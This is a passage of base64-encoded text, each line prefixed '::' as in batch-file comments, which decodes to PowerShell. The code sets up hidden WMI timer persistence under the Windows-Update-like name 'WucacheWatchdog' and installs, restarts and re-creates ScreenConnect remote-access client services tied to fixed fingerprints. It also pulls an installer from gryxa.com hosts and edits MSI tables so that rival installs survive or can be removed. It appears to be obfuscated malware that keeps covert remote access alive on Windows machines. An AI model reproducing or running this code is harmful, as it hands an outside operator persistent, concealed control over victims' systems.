::ID0gJ3Jvb3RcY2ltdjInOyBRdWVyeUxhbmd1YWdlID0gJ1dRTCc7DQogICAgICAg
::ICAgICAgICAgICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19UaW1l
::ckV2ZW50IFdIRVJFIFRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0NCiAgICAg
::ICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlw
::dGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIGANCiAgICAgICAg
::ICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dDJzsgQ29t
::bWFuZExpbmVUZW1wbGF0ZSA9ICJjbWQuZXhlIC9jIGAiJE1vblBhdGhgIiI7IFJ1
::bkludGVyYWN0aXZlbHkgPSAkZmFsc2UgfQ0KICAgICAgICBTZXQtV21pSW5zdGFu
::Y2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJU
::b0NvbnN1bWVyQmluZGluZyBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IEZp
::bHRlciA9ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQtTnVsbA0KICAgIH0gY2F0
::Y2ggeyAkb2sgPSAkZmFsc2UgfQ0KICAgIHJldHVybiAkb2sNCn0NCg0KZnVuY3Rp
::b24gVGVzdC1XYXRjaGRvZ0dyYXBoIHsNCiAgICAkdCA9IEdldC1XbWlPYmplY3Qg
::LU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRlcnZhbFRp
::bWVySW5zdHJ1Y3Rpb24gLUZpbHRlciAiVGltZXJJZD0nV3VjYWNoZVdhdGNoZG9n
::JyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAkZiA9IEdldC1X
::bWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19F
::dmVudEZpbHRlciAtRmlsdGVyICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dGJyIgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAkYyA9IEdldC1XbWlPYmpl
::Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExp
::bmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0Mn
::IiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICRiID0gJG51bGwN
::CiAgICBpZiAoJGYgLWFuZCAkYykgew0KICAgICAgICAkYiA9IEdldC1XbWlPYmpl
::Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJU
::b0NvbnN1bWVyQmluZGluZyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8
::DQogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5GaWx0ZXIgLWxpa2UgJypX
::dWNhY2hlV2F0Y2hkb2dGKicgLWFuZCAkXy5Db25zdW1lciAtbGlrZSAnKld1Y2Fj
::aGVXYXRjaGRvZ0MqJyB9IHwNCiAgICAgICAgICAgIFNlbGVjdC1PYmplY3QgLUZp
::cnN0IDENCiAgICB9DQogICAgcmV0dXJuIFtib29sXSgkdCAtYW5kICRmIC1hbmQg
::JGMgLWFuZCAkYikNCn0NCg0KZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsNCiAg
::ICBpZiAoVGVzdC1XYXRjaGRvZ0dyYXBoKSB7IHJldHVybiAnT0snIH0NCiAgICBp
::ZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJ01JU1NJTkcnIH0NCiAgICBpZiAo
::SW5zdGFsbC1XYXRjaGRvZykgeyByZXR1cm4gJ1JFQVJNRUQnIH0NCiAgICByZXR1
::cm4gJ0ZBSUwnDQp9DQoNCiMgQ29ycmVjdCAzMi1iaXQgKyA2NC1iaXQgQVJQIGhp
::dmVzLiBMNiBhbmQgZWFybGllciB1c2VkIGEgdHJ1bmNhdGVkDQojIFdPVzY0MzJO
::b2RlIHBhdGggKG1pc3NpbmcgTWljcm9zb2Z0XFdpbmRvd3MpIHNvIEVWRVJZIDMy
::LWJpdCBTQyBwcm9kdWN0DQojIHdhcyBpbnZpc2libGUgdG8gcmVwYWlyL2V4dGVy
::bWluYXRlL3JlZ2lzdGVyZWQuDQokc2NyaXB0OlVuaW5zdGFsbFJvb3RzID0gQCgN
::CiAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
::cnNpb25cVW5pbnN0YWxsJywNCiAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5v
::ZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJw0K
::KQ0KDQpmdW5jdGlvbiBUZXN0LVNDUmVnaXN0ZXJlZChbc3RyaW5nXSRGaW5nZXJw
::cmludCkgew0KICAgICMgTDg6IE5FVkVSIHVzZSByZXR1cm4gaW5zaWRlIEZvckVh
::Y2gtT2JqZWN0IC0gaXQgb25seSBleGl0cyB0aGUNCiAgICAjIHBpcGVsaW5lIGl0
::ZXJhdGlvbiwgc28gdGhpcyBmdW5jdGlvbiBhbHdheXMgZmVsbCB0aHJvdWdoIHRv
::ICdubycNCiAgICAjIGFuZCB0aGUgbW9uIG9ycGhhbi1sYWRkZXIgZGVsZXRlZCBo
::ZWFsdGh5IHJlZ2lzdGVyZWQgc2VydmljZXMuDQogICAgaWYgKC1ub3QgJEZpbmdl
::cnByaW50KSB7IHJldHVybiAnbm8nIH0NCiAgICAkbmFtZSA9ICJTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAgICBmb3JlYWNoICgkcm9vdCBp
::biAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7DQogICAgICAgIGlmICgtbm90IChU
::ZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgZm9yZWFjaCAo
::JGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZSkpIHsNCiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3Bl
::cnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5E
::aXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYgKCRkbiAtYW5kICgkZG4gLWllcSAk
::bmFtZSkgLWFuZCAoJGtleS5QU0NoaWxkTmFtZSAtbGlrZSAneyp9JykpIHsgcmV0
::dXJuICd5ZXMnIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJ25vJw0K
::fQ0KDQpmdW5jdGlvbiBSZXBhaXItU0NTZXJ2aWNlKFtzdHJpbmddJEZpbmdlcnBy
::aW50KSB7DQogICAgIyBMMzA6IE5FVkVSIHJ1biBtc2lleGVjIC9mYSBvciAvaSBv
::biBhIFNjcmVlbkNvbm5lY3QgcHJvZHVjdCDigJQgU0MgaW5zdGFuY2VzIHNoYXJl
::DQogICAgIyBsZWdhY3kgVXBncmFkZUNvZGVzLCBzbyBhbnkgbXNpZXhlYyByZXBh
::aXIvaW5zdGFsbCBvbiBvbmUgRlAgdHJpZ2dlcnMgYQ0KICAgICMgbWFqb3ItdXBn
::cmFkZSByZW1vdmFsIHRoYXQga25vY2tzIHRoZSBHcnl4YSBzaWJsaW5nIE9GRkxJ
::TkUuIFNlcnZpY2UtbGV2ZWwgaGVhbCBvbmx5Lg0KICAgIGlmICgtbm90ICRGaW5n
::ZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9DQogICAgJG5hbWUgPSAiU2NyZWVu
::Q29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiDQogICAgJHN2YyA9IEdldC1T
::ZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::DQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKSB7
::IHJldHVybiAnc3ZjLXJ1bm5pbmcnIH0NCiAgICBpZiAoJHN2Yykgew0KICAgICAg
::ICAjIHByZXNlbnQgYnV0IHN0b3BwZWQgLT4gc2VydmljZS1sZXZlbCBzdGFydCwg
::bm8gbXNpZXhlYw0KICAgICAgICAmIHNjLmV4ZSBjb25maWcgIiRuYW1lIiBzdGFy
::dD0gYXV0byAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJiBzYy5leGUgZmFpbHVy
::ZSAiJG5hbWUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzUwMDAvcmVz
::dGFydC81MDAwL3Jlc3RhcnQvNTAwMCAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAg
::JiBzYy5leGUgc3RhcnQgIiRuYW1lIiAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAg
::U3RhcnQtU2xlZXAgLVNlY29uZHMgNg0KICAgICAgICAmIHNjLmV4ZSBzdGFydCAi
::JG5hbWUiIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAkc3ZjID0gR2V0LVNlcnZp
::Y2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAg
::ICAgICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKSB7
::IHJldHVybiAnc3ZjLXN0YXJ0ZWQnIH0NCiAgICAgICAgcmV0dXJuICdzdmMtc3Rp
::bGwtc3RvcHBlZC1ub3JlcGFpcihtc2lleGVjLWRpc2FibGVkKScNCiAgICB9DQog
::ICAgIyBzZXJ2aWNlIGVudHJ5IGdvbmU6IHJlLWNyZWF0ZSBmcm9tIHRoZSByZWdp
::c3RlcmVkIHByb2R1Y3QncyBpbnN0YWxsIGRpciBXSVRIT1VUIG1zaWV4ZWMuDQog
::ICAgIyBJZiBiaW5hcmllcyBleGlzdCwgc2MuZXhlIGNyZWF0ZSArIHN0YXJ0LiBF
::bHNlIHJlcG9ydCBzbyBjYWxsZXIgY2FuIGRlY2lkZSAobmV2ZXIgL2ZhLCBuZXZl
::ciAvaSkuDQogICAgJGRpciA9ICRudWxsDQogICAgZm9yZWFjaCAoJGJhc2UgaW4g
::QCgke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkg
::ew0KICAgICAgICAkY2FuZCA9IEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVj
::dCBDbGllbnQgKCRGaW5nZXJwcmludCkiDQogICAgICAgIGlmIChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoIChKb2luLVBhdGggJGNhbmQgJ1NjcmVlbkNvbm5lY3QuQ2xp
::ZW50U2VydmljZS5leGUnKSkgeyAkZGlyID0gJGNhbmQ7IGJyZWFrIH0NCiAgICB9
::DQogICAgaWYgKC1ub3QgJGRpcikgeyByZXR1cm4gJ25vdC1yZWdpc3RlcmVkLW5v
::cmVwYWlyKG1zaWV4ZWMtZGlzYWJsZWQpJyB9DQogICAgJGV4ZSA9IEpvaW4tUGF0
::aCAkZGlyICdTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlJw0KICAgICYg
::c2MuZXhlIGNyZWF0ZSAiJG5hbWUiIGJpblBhdGg9ICJgIiRleGVgIiIgc3RhcnQ9
::IGF1dG8gRGlzcGxheU5hbWU9ICIkbmFtZSIgMj4mMSB8IE91dC1OdWxsDQogICAg
::JiBzYy5leGUgZmFpbHVyZSAiJG5hbWUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
::ZXN0YXJ0LzUwMDAvcmVzdGFydC81MDAwL3Jlc3RhcnQvNTAwMCAyPiYxIHwgT3V0
::LU51bGwNCiAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+JjEgfCBPdXQtTnVs
::bA0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUNCiAgICAkc3ZjID0gR2V0LVNl
::cnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpIHsg
::cmV0dXJuICdzdmMtcmVjcmVhdGVkLXN0YXJ0ZWQnIH0NCiAgICByZXR1cm4gJ3N2
::Yy1yZWNyZWF0ZWQtbm90LXJ1bm5pbmcnDQp9DQoNCiMg4pSA4pSAIEdyeXhhIFND
::IHYyIChjbGVhbiByZXdyaXRlKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIANCiMgU2luZ2xlLWZsaWdodCBlbnN1cmUuIFJ1bm5p
::bmcgPT4gaGVhbHRoeS4gU3RvcHBlZCBzdmMgPT4gc3RhcnQuDQojIEJyb2tlbi9T
::dHVjayA9PiBjbGVhbi1yZWluc3RhbGwgb25jZSwgZGV0YWNoZWQuIEFic2VudCA9
::PiBpbnN0YWxsIG9uY2UuDQojIE5vIC9mYSwgbm8gaW5saW5lIGJsb2NraW5nIC9p
::LCBubyBmYWxzZSAiYWxyZWFkeV9ydW5uaW5nIi4NCiRzY3JpcHQ6R3J5eGFEZWZh
::dWx0RnAgPSAnMzZlNTA2ZmYwMTZiMjE1MScNCiRzY3JpcHQ6R3J5eGFNc2lVcmwg
::PSAnaHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNvbm5lY3QuQ2xpZW50
::U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QnDQokc2NyaXB0OkdyeXhhUmVsYXlI
::b3N0ID0gJ3VwZGF0ZS5ncnl4YS5jb20nDQokc2NyaXB0OkdyeXhhVWlIb3N0ID0g
::J3VpLmdyeXhhLmNvbScNCiRzY3JpcHQ6U2V2cnpEZWZhdWx0UHJpbWFyeSA9ICc1
::ZjYwMTA1Nzk4NTJlNTA3Jw0KJHNjcmlwdDpTZXZyekRlZmF1bHRBbHQgPSAnZjg2
::MWM4MTQwZDQ1MzQyNycNCiRzY3JpcHQ6U2V2cnpLZWVwID0gQCgkc2NyaXB0OlNl
::dnJ6RGVmYXVsdFByaW1hcnksICRzY3JpcHQ6U2V2cnpEZWZhdWx0QWx0KQ0KIyBT
::ZXQgdG8gYSAxNi1oZXggRlAgeW91IFdBTlQgaW5zdGFsbGVkIChhZnRlciByb3Rh
::dGluZyBvbiB0aGUgcGFuZWwpLiBBbnkgaG9zdA0KIyBydW5uaW5nIGEgZGlmZmVy
::ZW50IEZQIG1pZ3JhdGVzIHRvIHRoaXMgb25lLiBMZWF2ZSAnJyB0byBqdXN0IHRy
::YWNrIHdoYXRldmVyIHJ1bnMuDQokc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcCA9ICcz
::NmU1MDZmZjAxNmIyMTUxJw0KDQojIEw0MDogUlNBIHB1YmxpYyBrZXkgZm9yIHVw
::ZGF0ZS5tYW5pZmVzdCB2ZXJpZmljYXRpb24gKHByaXZhdGUga2V5IGluIGtleXMv
::LCBnaXRpZ25vcmVkKQ0KJHNjcmlwdDpVcGRhdGVQdWJLZXlYbWwgPSBAJw0KPFJT
::QUtleVZhbHVlPjxNb2R1bHVzPnRBQlpQbnZzdXBvcmkxOW10SmJIb1QxdUZHVkxO
::S3FPTkIweHR2SUJINEhwZk01VStTdEN1R25FZEl5UHlrTVFQakRFbFZCWk9lYThw
::ZGRCeHhQTUk5NGQ0VkJwZHduUWVkV0hsbmw2RXVRc0pMMk1NYzB4bzBkdXpwUWRQ
::VmpEbmVJSXRPeFZNbmw0TW1UU1M4aTE1T2ZOVEg2eWRkbGZpNnROZlR2dkN0a3hs
::TDljMHFYeHRJb1lMUUw5akMyOTR0Mk8wdk9zQWxpaDBoUzZYQUdwOE9BVEtSL0tW
::UHA4cWZ3OHR6clN2S2dZa3BlNzliSjY3YnRqTzdxVEh2MUpwUDA0eGVZdENLalNG
::TjZYaDAyZHJ0cXZ5dUNIdncxKzBIWWZ2aWFINXlOQXB3b054L2Y1VTYzdU1paXJL
::dUphWk1CdlhNOHVteHlrQUdycWRTVTBwUT09PC9Nb2R1bHVzPjxFeHBvbmVudD5B
::UUFCPC9FeHBvbmVudD48L1JTQUtleVZhbHVlPg0KJ0ANCg0KZnVuY3Rpb24gR2V0
::LUdyeXhhQ2ZnUGF0aCB7IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGEuY2ZnJyB9
::DQpmdW5jdGlvbiBHZXQtU2V2cnpDZmdQYXRoIHsgSm9pbi1QYXRoICRXb3JrRGly
::ICdzZXZyei5jZmcnIH0NCg0KZnVuY3Rpb24gR2V0LVNldnJ6S2VlcCB7DQogICAg
::JHByaW0gPSAkc2NyaXB0OlNldnJ6RGVmYXVsdFByaW1hcnkNCiAgICAkYWx0ID0g
::JHNjcmlwdDpTZXZyekRlZmF1bHRBbHQNCiAgICAkcCA9IEdldC1TZXZyekNmZ1Bh
::dGgNCiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAg
::ICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAo
::JF8gLW1hdGNoICdeUFJJTUFSWV9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7
::ICRwcmltID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0NCiAgICAgICAgICAgIGlm
::ICgkXyAtbWF0Y2ggJ15BTFRfRlA9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAk
::YWx0ID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0NCiAgICAgICAgICAgIGlmICgk
::XyAtbWF0Y2ggJ15FWFBFQ1RFRF9QUklNQVJZPShbMC05YS1mQS1GXXsxNn0pXHMq
::JCcpIHsgJHByaW0gPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAgICAgICAg
::ICAgaWYgKCRfIC1tYXRjaCAnXkVYUEVDVEVEX0FMVD0oWzAtOWEtZkEtRl17MTZ9
::KVxzKiQnKSB7ICRhbHQgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAgICAg
::ICB9DQogICAgfQ0KICAgICRzY3JpcHQ6U2V2cnpLZWVwID0gQCgkcHJpbSwgJGFs
::dCkNCiAgICByZXR1cm4gQCgkcHJpbSwgJGFsdCkNCn0NCg0KZnVuY3Rpb24gU2V0
::LVNldnJ6RnAoW3N0cmluZ10kUHJpbWFyeSwgW3N0cmluZ10kQWx0KSB7DQogICAg
::aWYgKC1ub3QgJFByaW1hcnkpIHsgJFByaW1hcnkgPSAkc2NyaXB0OlNldnJ6RGVm
::YXVsdFByaW1hcnkgfQ0KICAgIGlmICgtbm90ICRBbHQpIHsgJEFsdCA9ICRzY3Jp
::cHQ6U2V2cnpEZWZhdWx0QWx0IH0NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1M
::aXRlcmFsUGF0aCAkV29ya0RpcikpIHsgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVj
::dG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2UgfCBPdXQtTnVsbCB9DQogICAgQCgN
::CiAgICAgICAgIlBSSU1BUllfRlA9JCgkUHJpbWFyeS5Ub0xvd2VyKCkpIiwNCiAg
::ICAgICAgIkFMVF9GUD0kKCRBbHQuVG9Mb3dlcigpKSIsDQogICAgICAgICJFWFBF
::Q1RFRF9QUklNQVJZPSQoJFByaW1hcnkuVG9Mb3dlcigpKSIsDQogICAgICAgICJF
::WFBFQ1RFRF9BTFQ9JCgkQWx0LlRvTG93ZXIoKSkiLA0KICAgICAgICAiVVBEQVRF
::RD0kKChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSki
::DQogICAgKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoR2V0LVNldnJ6Q2Zn
::UGF0aCkgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQ0KICAgICRzY3JpcHQ6U2V2cnpL
::ZWVwID0gQCgkUHJpbWFyeS5Ub0xvd2VyKCksICRBbHQuVG9Mb3dlcigpKQ0KfQ0K
::DQpmdW5jdGlvbiBTeW5jLVNldnJ6RXhwZWN0ZWQoW3N0cmluZ10kRXhwZWN0ZWRU
::ZXh0KSB7DQogICAgIyBBcHBseSByZXBvIHNldnJ6X2V4cGVjdGVkLmNmZyBib2R5
::IChFWFBFQ1RFRF9QUklNQVJZPS9FWFBFQ1RFRF9BTFQ9IGxpbmVzKQ0KICAgICRw
::cmltID0gJG51bGw7ICRhbHQgPSAkbnVsbA0KICAgIGZvcmVhY2ggKCRsaW5lIGlu
::ICgkRXhwZWN0ZWRUZXh0IC1zcGxpdCAiYHI/YG4iKSkgew0KICAgICAgICBpZiAo
::JGxpbmUgLW1hdGNoICdeRVhQRUNURURfUFJJTUFSWT0oWzAtOWEtZkEtRl17MTZ9
::KVxzKiQnKSB7ICRwcmltID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0NCiAgICAg
::ICAgaWYgKCRsaW5lIC1tYXRjaCAnXkVYUEVDVEVEX0FMVD0oWzAtOWEtZkEtRl17
::MTZ9KVxzKiQnKSB7ICRhbHQgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAg
::IH0NCiAgICBpZiAoLW5vdCAkcHJpbSkgeyAkcHJpbSA9IChHZXQtU2V2cnpLZWVw
::KVswXSB9DQogICAgaWYgKC1ub3QgJGFsdCkgeyAkYWx0ID0gKEdldC1TZXZyektl
::ZXApWzFdIH0NCiAgICBTZXQtU2V2cnpGcCAkcHJpbSAkYWx0DQogICAgcmV0dXJu
::ICJTRVZSWnwkcHJpbXwkYWx0Ig0KfQ0KDQpmdW5jdGlvbiBQcm90ZWN0LU1zaVNp
::YmxpbmdTYWZlKFtzdHJpbmddJE1zaVBhdGgpIHsNCiAgICAjIEw0MC9MNDQ6IGNv
::cHkgTVNJIGFuZCBERUxFVEUgRlJPTSBVcGdyYWRlIHNvIC9pIGNhbm5vdCBSZW1v
::dmVFeGlzdGluZ1Byb2R1Y3RzIHNpYmxpbmdzLg0KICAgICMgTDQ0OiB2ZXJpZnkg
::VXBncmFkZSBpcyBlbXB0eSBhZnRlciBERUxFVEUg4oCUIG5ldmVyIHJldHVybiBh
::IHN0aWxsLWRhbmdlcm91cyBNU0kuDQogICAgaWYgKC1ub3QgJE1zaVBhdGggLW9y
::IC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1zaVBhdGgpKSB7IHJldHVy
::biAkbnVsbCB9DQogICAgJHNhZmUgPSBKb2luLVBhdGggJGVudjpURU1QICgic2Nf
::c2FmZV97MH0ubXNpIiAtZiBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicp
::KQ0KICAgIHRyeSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1z
::aVBhdGggLURlc3RpbmF0aW9uICRzYWZlIC1Gb3JjZQ0KICAgICAgICAkaSA9IE5l
::dy1PYmplY3QgLUNvbU9iamVjdCBXaW5kb3dzSW5zdGFsbGVyLkluc3RhbGxlcg0K
::ICAgICAgICAkZGIgPSAkaS5PcGVuRGF0YWJhc2UoKFJlc29sdmUtUGF0aCAtTGl0
::ZXJhbFBhdGggJHNhZmUpLlBhdGgsIDEpDQogICAgICAgIHRyeSB7DQogICAgICAg
::ICAgICAkdiA9ICRkYi5PcGVuVmlldygnREVMRVRFIEZST00gYFVwZ3JhZGVgJykN
::CiAgICAgICAgICAgICR2LkV4ZWN1dGUoKSB8IE91dC1OdWxsDQogICAgICAgICAg
::ICAkZGIuQ29tbWl0KCkNCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICBS
::ZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHNhZmUgLUZvcmNlIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICByZXR1cm4gJG51bGwNCiAg
::ICAgICAgfQ0KICAgICAgICAjIHZlcmlmeSBlbXB0eQ0KICAgICAgICB0cnkgew0K
::ICAgICAgICAgICAgJGRiMiA9ICRpLk9wZW5EYXRhYmFzZSgoUmVzb2x2ZS1QYXRo
::IC1MaXRlcmFsUGF0aCAkc2FmZSkuUGF0aCwgMCkNCiAgICAgICAgICAgICRjID0g
::JGRiMi5PcGVuVmlldygnU0VMRUNUIGBVcGdyYWRlQ29kZWAgRlJPTSBgVXBncmFk
::ZWAnKQ0KICAgICAgICAgICAgJGMuRXhlY3V0ZSgpIHwgT3V0LU51bGwNCiAgICAg
::ICAgICAgIGlmICgkYy5GZXRjaCgpKSB7DQogICAgICAgICAgICAgICAgUmVtb3Zl
::LUl0ZW0gLUxpdGVyYWxQYXRoICRzYWZlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgICAgIHJldHVybiAkbnVsbA0KICAg
::ICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICMgbWlz
::c2luZyBVcGdyYWRlIHRhYmxlID0gYWxyZWFkeSBzYWZlDQogICAgICAgIH0NCiAg
::ICAgICAgcmV0dXJuICRzYWZlDQogICAgfSBjYXRjaCB7DQogICAgICAgIGlmIChU
::ZXN0LVBhdGggLUxpdGVyYWxQYXRoICRzYWZlKSB7IFJlbW92ZS1JdGVtIC1MaXRl
::cmFsUGF0aCAkc2FmZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfQ0KICAgICAgICByZXR1cm4gJG51bGwNCiAgICB9DQp9DQoNCmZ1bmN0aW9u
::IFRlc3QtVXBkYXRlTWFuaWZlc3QoW3N0cmluZ10kTWFuaWZlc3RQYXRoLCBbc3Ry
::aW5nXSRTaWdQYXRoLCBbaGFzaHRhYmxlXSRGaWxlTWFwKSB7DQogICAgIyBWZXJp
::ZnkgUlNBLVNIQTI1NiBzaWduYXR1cmUgb3ZlciB1cGRhdGUubWFuaWZlc3QsIHRo
::ZW4gU0hBMjU2IG9mIGVhY2ggc3RhZ2VkIGZpbGUuDQogICAgaWYgKC1ub3QgKFRl
::c3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1hbmlmZXN0UGF0aCkgLW9yIC1ub3QgKFRl
::c3QtUGF0aCAtTGl0ZXJhbFBhdGggJFNpZ1BhdGgpKSB7IHJldHVybiAnbWlzc2lu
::ZycgfQ0KICAgIGlmICgtbm90ICRzY3JpcHQ6VXBkYXRlUHViS2V5WG1sIC1vciAk
::c2NyaXB0OlVwZGF0ZVB1YktleVhtbCAtbWF0Y2ggJ1BMQUNFSE9MREVSJykgeyBy
::ZXR1cm4gJ25vLXB1YmtleScgfQ0KICAgIHRyeSB7DQogICAgICAgICRieXRlcyA9
::IFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKChSZXNvbHZlLVBhdGggLUxpdGVyYWxQ
::YXRoICRNYW5pZmVzdFBhdGgpLlBhdGgpDQogICAgICAgICRzaWcgPSBbQ29udmVy
::dF06OkZyb21CYXNlNjRTdHJpbmcoKFtJTy5GaWxlXTo6UmVhZEFsbFRleHQoKFJl
::c29sdmUtUGF0aCAtTGl0ZXJhbFBhdGggJFNpZ1BhdGgpLlBhdGgpLlRyaW0oKSkp
::DQogICAgICAgICRyc2EgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5S
::U0FdOjpDcmVhdGUoKQ0KICAgICAgICAkcnNhLkZyb21YbWxTdHJpbmcoJHNjcmlw
::dDpVcGRhdGVQdWJLZXlYbWwpDQogICAgICAgIGlmICgtbm90ICRyc2EuVmVyaWZ5
::RGF0YSgkYnl0ZXMsICRzaWcsIFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5
::Lkhhc2hBbGdvcml0aG1OYW1lXTo6U0hBMjU2LCBbU3lzdGVtLlNlY3VyaXR5LkNy
::eXB0b2dyYXBoeS5SU0FTaWduYXR1cmVQYWRkaW5nXTo6UGtjczEpKSB7DQogICAg
::ICAgICAgICByZXR1cm4gJ2JhZC1zaWcnDQogICAgICAgIH0NCiAgICAgICAgJGRv
::YyA9IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkTWFuaWZlc3RQYXRoIC1SYXcg
::fCBDb252ZXJ0RnJvbS1Kc29uDQogICAgICAgIGZvcmVhY2ggKCRuYW1lIGluICRG
::aWxlTWFwLktleXMpIHsNCiAgICAgICAgICAgICRwYXRoID0gJEZpbGVNYXBbJG5h
::bWVdDQogICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
::aCAkcGF0aCkpIHsgcmV0dXJuICJtaXNzaW5nLWZpbGU6JG5hbWUiIH0NCiAgICAg
